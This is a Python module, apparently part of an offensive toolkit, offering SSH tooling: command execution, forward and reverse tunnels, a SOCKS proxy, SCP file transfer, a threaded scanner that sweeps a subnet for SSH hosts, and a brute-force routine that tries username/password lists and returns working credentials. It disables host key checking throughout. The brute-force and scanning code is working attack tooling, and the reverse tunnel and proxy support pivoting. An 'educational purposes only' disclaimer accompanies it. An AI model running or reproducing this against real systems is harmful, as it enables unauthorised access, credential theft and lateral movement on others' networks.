#!/usr/bin/env python3
"""
Elite SSH Command - Advanced SSH operations and tunneling
Comprehensive SSH functionality with security features
"""

import ctypes
from ctypes import wintypes
import subprocess
import socket
import threading
import time
import os

class EliteSSH:
    """Elite SSH operations and tunneling"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.active_connections = {}
        self.active_tunnels = {}
        
    def execute(self, action, host=None, username=None, password=None, port=22, **kwargs):
        """Execute SSH operations"""
        try:
            if action == 'connect':
                return self._ssh_connect(host, username, password, port, kwargs.get('command'))
            elif action == 'tunnel':
                return self._create_ssh_tunnel(host, username, password, port, kwargs.get('local_port'), kwargs.get('remote_port'))
            elif action == 'reverse_tunnel':
                return self._create_reverse_tunnel(host, username, password, port, kwargs.get('local_port'), kwargs.get('remote_port'))
            elif action == 'socks_proxy':
                return self._create_socks_proxy(host, username, password, port, kwargs.get('proxy_port', 1080))
            elif action == 'file_transfer':
                return self._ssh_file_transfer(host, username, password, port, kwargs.get('local_file'), kwargs.get('remote_file'), kwargs.get('direction', 'upload'))
            elif action == 'scan':
                return self._ssh_scan(kwargs.get('target_range', '192.168.1.0/24'))
            elif action == 'brute_force':
                return self._ssh_brute_force(host, kwargs.get('usernames', []), kwargs.get('passwords', []), port)
            elif action == 'key_auth':
                return self._ssh_key_auth(host, username, kwargs.get('private_key'), port)
            elif action == 'list_connections':
                return self._list_connections()
            elif action == 'close_connection':
                return self._close_connection(kwargs.get('connection_id'))
            else:
                return {
                    'success': False,
                    'error': f'Unknown action: {action}',
                    'available_actions': ['connect', 'tunnel', 'reverse_tunnel', 'socks_proxy', 'file_transfer', 'scan', 'brute_force', 'key_auth', 'list_connections', 'close_connection']
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH operation failed: {str(e)}'
            }
    
    def _ssh_connect(self, host, username, password, port, command):
        """Connect to SSH server and execute command"""
        try:
            if not all([host, username]):
                return {
                    'success': False,
                    'error': 'Host and username are required'
                }
            
            # Try using OpenSSH client if available
            ssh_cmd = ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null']
            
            if port != 22:
                ssh_cmd.extend(['-p', str(port)])
            
            if password:
                # Use sshpass if available, otherwise try expect-like behavior
                ssh_cmd = ['sshpass', '-p', password] + ssh_cmd
            
            ssh_cmd.append(f'{username}@{host}')
            
            if command:
                ssh_cmd.append(command)
            
            try:
                result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=30)
                
                return {
                    'success': result.returncode == 0,
                    'action': 'connect',
                    'host': host,
                    'username': username,
                    'port': port,
                    'command': command,
                    'output': result.stdout,
                    'error_output': result.stderr,
                    'return_code': result.returncode
                }
                
            except FileNotFoundError:
                # SSH client not available, try alternative method
                return self._alternative_ssh_connect(host, username, password, port, command)
                
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH connection failed: {str(e)}'
            }
    
    def _alternative_ssh_connect(self, host, username, password, port, command):
        """Alternative SSH connection using Python libraries"""
        try:
            # Try using paramiko if available
            try:
                import paramiko
                
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                ssh.connect(host, port=port, username=username, password=password, timeout=10)
                
                if command:
                    stdin, stdout, stderr = ssh.exec_command(command)
                    output = stdout.read().decode('utf-8')
                    error_output = stderr.read().decode('utf-8')
                    return_code = stdout.channel.recv_exit_status()
                else:
                    output = "SSH connection established successfully"
                    error_output = ""
                    return_code = 0
                
                ssh.close()
                
                return {
                    'success': return_code == 0,
                    'action': 'connect',
                    'host': host,
                    'username': username,
                    'port': port,
                    'command': command,
                    'output': output,
                    'error_output': error_output,
                    'return_code': return_code,
                    'method': 'paramiko'
                }
                
            except ImportError:
                # Paramiko not available, use basic socket connection test
                return self._test_ssh_connection(host, port, username)
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Alternative SSH connection failed: {str(e)}'
            }
    
    def _test_ssh_connection(self, host, port, username):
        """Test SSH connection availability"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return {
                    'success': True,
                    'action': 'connect',
                    'host': host,
                    'port': port,
                    'username': username,
                    'message': 'SSH port is open and accessible',
                    'note': 'Full SSH functionality requires SSH client or paramiko library'
                }
            else:
                return {
                    'success': False,
                    'error': f'Cannot connect to {host}:{port}',
                    'host': host,
                    'port': port
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Connection test failed: {str(e)}'
            }
    
    def _create_ssh_tunnel(self, host, username, password, port, local_port, remote_port):
        """Create SSH tunnel (port forwarding)"""
        try:
            if not all([host, username, local_port, remote_port]):
                return {
                    'success': False,
                    'error': 'Host, username, local_port, and remote_port are required'
                }
            
            # SSH tunnel command
            tunnel_cmd = ['ssh', '-N', '-L', f'{local_port}:localhost:{remote_port}']
            
            if port != 22:
                tunnel_cmd.extend(['-p', str(port)])
            
            if password:
                tunnel_cmd = ['sshpass', '-p', password] + tunnel_cmd
            
            tunnel_cmd.extend(['-o', 'StrictHostKeyChecking=no', f'{username}@{host}'])
            
            try:
                # Start tunnel in background
                process = subprocess.Popen(tunnel_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Give it a moment to establish
                time.sleep(2)
                
                # Check if process is still running
                if process.poll() is None:
                    tunnel_id = f"tunnel_{len(self.active_tunnels)}"
                    self.active_tunnels[tunnel_id] = {
                        'process': process,
                        'host': host,
                        'local_port': local_port,
                        'remote_port': remote_port,
                        'created': time.time()
                    }
                    
                    return {
                        'success': True,
                        'action': 'tunnel',
                        'tunnel_id': tunnel_id,
                        'host': host,
                        'local_port': local_port,
                        'remote_port': remote_port,
                        'message': f'SSH tunnel created: localhost:{local_port} -> {host}:{remote_port}'
                    }
                else:
                    stdout, stderr = process.communicate()
                    return {
                        'success': False,
                        'error': 'SSH tunnel failed to establish',
                        'stderr': stderr.decode('utf-8')
                    }
                    
            except FileNotFoundError:
                return {
                    'success': False,
                    'error': 'SSH client not available for tunneling'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH tunnel creation failed: {str(e)}'
            }
    
    def _create_reverse_tunnel(self, host, username, password, port, local_port, remote_port):
        """Create reverse SSH tunnel"""
        try:
            if not all([host, username, local_port, remote_port]):
                return {
                    'success': False,
                    'error': 'Host, username, local_port, and remote_port are required'
                }
            
            # Reverse SSH tunnel command
            tunnel_cmd = ['ssh', '-N', '-R', f'{remote_port}:localhost:{local_port}']
            
            if port != 22:
                tunnel_cmd.extend(['-p', str(port)])
            
            if password:
                tunnel_cmd = ['sshpass', '-p', password] + tunnel_cmd
            
            tunnel_cmd.extend(['-o', 'StrictHostKeyChecking=no', f'{username}@{host}'])
            
            try:
                process = subprocess.Popen(tunnel_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                
                if process.poll() is None:
                    tunnel_id = f"reverse_tunnel_{len(self.active_tunnels)}"
                    self.active_tunnels[tunnel_id] = {
                        'process': process,
                        'host': host,
                        'local_port': local_port,
                        'remote_port': remote_port,
                        'type': 'reverse',
                        'created': time.time()
                    }
                    
                    return {
                        'success': True,
                        'action': 'reverse_tunnel',
                        'tunnel_id': tunnel_id,
                        'host': host,
                        'local_port': local_port,
                        'remote_port': remote_port,
                        'message': f'Reverse SSH tunnel created: {host}:{remote_port} -> localhost:{local_port}'
                    }
                else:
                    stdout, stderr = process.communicate()
                    return {
                        'success': False,
                        'error': 'Reverse SSH tunnel failed to establish',
                        'stderr': stderr.decode('utf-8')
                    }
                    
            except FileNotFoundError:
                return {
                    'success': False,
                    'error': 'SSH client not available for reverse tunneling'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Reverse SSH tunnel creation failed: {str(e)}'
            }
    
    def _create_socks_proxy(self, host, username, password, port, proxy_port):
        """Create SOCKS proxy via SSH"""
        try:
            if not all([host, username]):
                return {
                    'success': False,
                    'error': 'Host and username are required'
                }
            
            # SOCKS proxy command
            proxy_cmd = ['ssh', '-N', '-D', str(proxy_port)]
            
            if port != 22:
                proxy_cmd.extend(['-p', str(port)])
            
            if password:
                proxy_cmd = ['sshpass', '-p', password] + proxy_cmd
            
            proxy_cmd.extend(['-o', 'StrictHostKeyChecking=no', f'{username}@{host}'])
            
            try:
                process = subprocess.Popen(proxy_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                
                if process.poll() is None:
                    proxy_id = f"socks_proxy_{len(self.active_tunnels)}"
                    self.active_tunnels[proxy_id] = {
                        'process': process,
                        'host': host,
                        'proxy_port': proxy_port,
                        'type': 'socks',
                        'created': time.time()
                    }
                    
                    return {
                        'success': True,
                        'action': 'socks_proxy',
                        'proxy_id': proxy_id,
                        'host': host,
                        'proxy_port': proxy_port,
                        'message': f'SOCKS proxy created on localhost:{proxy_port}'
                    }
                else:
                    stdout, stderr = process.communicate()
                    return {
                        'success': False,
                        'error': 'SOCKS proxy failed to establish',
                        'stderr': stderr.decode('utf-8')
                    }
                    
            except FileNotFoundError:
                return {
                    'success': False,
                    'error': 'SSH client not available for SOCKS proxy'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'SOCKS proxy creation failed: {str(e)}'
            }
    
    def _ssh_file_transfer(self, host, username, password, port, local_file, remote_file, direction):
        """Transfer files via SSH (SCP)"""
        try:
            if not all([host, username, local_file, remote_file]):
                return {
                    'success': False,
                    'error': 'Host, username, local_file, and remote_file are required'
                }
            
            # SCP command
            scp_cmd = ['scp', '-o', 'StrictHostKeyChecking=no']
            
            if port != 22:
                scp_cmd.extend(['-P', str(port)])
            
            if password:
                scp_cmd = ['sshpass', '-p', password] + scp_cmd
            
            if direction == 'upload':
                scp_cmd.extend([local_file, f'{username}@{host}:{remote_file}'])
            else:  # download
                scp_cmd.extend([f'{username}@{host}:{remote_file}', local_file])
            
            try:
                result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
                
                return {
                    'success': result.returncode == 0,
                    'action': 'file_transfer',
                    'direction': direction,
                    'host': host,
                    'local_file': local_file,
                    'remote_file': remote_file,
                    'output': result.stdout,
                    'error_output': result.stderr,
                    'return_code': result.returncode
                }
                
            except FileNotFoundError:
                return {
                    'success': False,
                    'error': 'SCP client not available for file transfer'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH file transfer failed: {str(e)}'
            }
    
    def _ssh_scan(self, target_range):
        """Scan for SSH services"""
        try:
            import ipaddress
            
            network = ipaddress.ip_network(target_range, strict=False)
            ssh_hosts = []
            
            def scan_host(ip):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((str(ip), 22))
                    
                    if result == 0:
                        # Try to get SSH banner
                        try:
                            sock.send(b'SSH-2.0-Scanner\\r\\n')
                            banner = sock.recv(1024).decode('utf-8').strip()
                            ssh_hosts.append({
                                'ip': str(ip),
                                'port': 22,
                                'banner': banner,
                                'status': 'open'
                            })
                        except:
                            ssh_hosts.append({
                                'ip': str(ip),
                                'port': 22,
                                'banner': 'Unknown',
                                'status': 'open'
                            })
                    
                    sock.close()
                    
                except Exception:
                    pass
            
            # Scan hosts (limit to first 50 to avoid long scans)
            hosts_to_scan = list(network.hosts())[:50]
            threads = []
            
            for ip in hosts_to_scan:
                thread = threading.Thread(target=scan_host, args=(ip,))
                thread.start()
                threads.append(thread)
            
            # Wait for all threads
            for thread in threads:
                thread.join(timeout=5)
            
            return {
                'success': True,
                'action': 'scan',
                'target_range': target_range,
                'hosts_scanned': len(hosts_to_scan),
                'ssh_hosts_found': len(ssh_hosts),
                'ssh_hosts': ssh_hosts
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH scan failed: {str(e)}'
            }
    
    def _ssh_brute_force(self, host, usernames, passwords, port):
        """SSH brute force attack (educational purposes)"""
        try:
            if not all([host, usernames, passwords]):
                return {
                    'success': False,
                    'error': 'Host, usernames list, and passwords list are required'
                }
            
            successful_logins = []
            attempts = 0
            
            for username in usernames:
                for password in passwords:
                    attempts += 1
                    
                    try:
                        # Test SSH connection
                        result = self._test_ssh_login(host, username, password, port)
                        
                        if result.get('success'):
                            successful_logins.append({
                                'username': username,
                                'password': password,
                                'host': host,
                                'port': port
                            })
                        
                        # Small delay to avoid overwhelming the server
                        time.sleep(0.5)
                        
                        # Stop after 50 attempts to avoid account lockouts
                        if attempts >= 50:
                            break
                            
                    except Exception:
                        continue
                
                if attempts >= 50:
                    break
            
            return {
                'success': True,
                'action': 'brute_force',
                'host': host,
                'port': port,
                'total_attempts': attempts,
                'successful_logins': len(successful_logins),
                'credentials': successful_logins,
                'warning': 'This is for educational purposes only. Unauthorized access is illegal.'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH brute force failed: {str(e)}'
            }
    
    def _test_ssh_login(self, host, username, password, port):
        """Test SSH login credentials"""
        try:
            # Try paramiko if available
            try:
                import paramiko
                
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                ssh.connect(host, port=port, username=username, password=password, timeout=5)
                ssh.close()
                
                return {'success': True}
                
            except ImportError:
                # Fallback to SSH command
                ssh_cmd = ['sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=5', 
                          '-o', 'StrictHostKeyChecking=no', f'{username}@{host}', 'exit']
                
                result = subprocess.run(ssh_cmd, capture_output=True, timeout=10)
                return {'success': result.returncode == 0}
                
        except Exception:
            return {'success': False}
    
    def _ssh_key_auth(self, host, username, private_key, port):
        """SSH authentication using private key"""
        try:
            if not all([host, username, private_key]):
                return {
                    'success': False,
                    'error': 'Host, username, and private_key path are required'
                }
            
            if not os.path.exists(private_key):
                return {
                    'success': False,
                    'error': f'Private key file not found: {private_key}'
                }
            
            # SSH with key authentication
            ssh_cmd = ['ssh', '-i', private_key, '-o', 'StrictHostKeyChecking=no']
            
            if port != 22:
                ssh_cmd.extend(['-p', str(port)])
            
            ssh_cmd.extend([f'{username}@{host}', 'echo "Key authentication successful"'])
            
            try:
                result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=15)
                
                return {
                    'success': result.returncode == 0,
                    'action': 'key_auth',
                    'host': host,
                    'username': username,
                    'private_key': private_key,
                    'output': result.stdout,
                    'error_output': result.stderr
                }
                
            except FileNotFoundError:
                return {
                    'success': False,
                    'error': 'SSH client not available'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'SSH key authentication failed: {str(e)}'
            }
    
    def _list_connections(self):
        """List active SSH connections and tunnels"""
        try:
            active_connections = []
            
            for conn_id, conn_info in self.active_connections.items():
                active_connections.append({
                    'id': conn_id,
                    'type': 'connection',
                    'host': conn_info.get('host'),
                    'created': conn_info.get('created'),
                    'status': 'active'
                })
            
            for tunnel_id, tunnel_info in self.active_tunnels.items():
                # Check if process is still running
                process = tunnel_info.get('process')
                status = 'active' if process and process.poll() is None else 'terminated'
                
                active_connections.append({
                    'id': tunnel_id,
                    'type': tunnel_info.get('type', 'tunnel'),
                    'host': tunnel_info.get('host'),
                    'local_port': tunnel_info.get('local_port'),
                    'remote_port': tunnel_info.get('remote_port'),
                    'proxy_port': tunnel_info.get('proxy_port'),
                    'created': tunnel_info.get('created'),
                    'status': status
                })
            
            return {
                'success': True,
                'action': 'list_connections',
                'total_connections': len(active_connections),
                'connections': active_connections
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to list connections: {str(e)}'
            }
    
    def _close_connection(self, connection_id):
        """Close SSH connection or tunnel"""
        try:
            if not connection_id:
                return {
                    'success': False,
                    'error': 'Connection ID is required'
                }
            
            # Check tunnels
            if connection_id in self.active_tunnels:
                tunnel_info = self.active_tunnels[connection_id]
                process = tunnel_info.get('process')
                
                if process and process.poll() is None:
                    process.terminate()
                    time.sleep(1)
                    if process.poll() is None:
                        process.kill()
                
                del self.active_tunnels[connection_id]
                
                return {
                    'success': True,
                    'action': 'close_connection',
                    'connection_id': connection_id,
                    'message': 'Connection closed successfully'
                }
            
            # Check connections
            if connection_id in self.active_connections:
                del self.active_connections[connection_id]
                
                return {
                    'success': True,
                    'action': 'close_connection',
                    'connection_id': connection_id,
                    'message': 'Connection closed successfully'
                }
            
            return {
                'success': False,
                'error': f'Connection ID not found: {connection_id}'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to close connection: {str(e)}'
            }

def elite_ssh(action, host=None, username=None, password=None, port=22, **kwargs):
    """Elite ssh command entry point"""
    ssh_cmd = EliteSSH()
    return ssh_cmd.execute(action, host, username, password, port, **kwargs)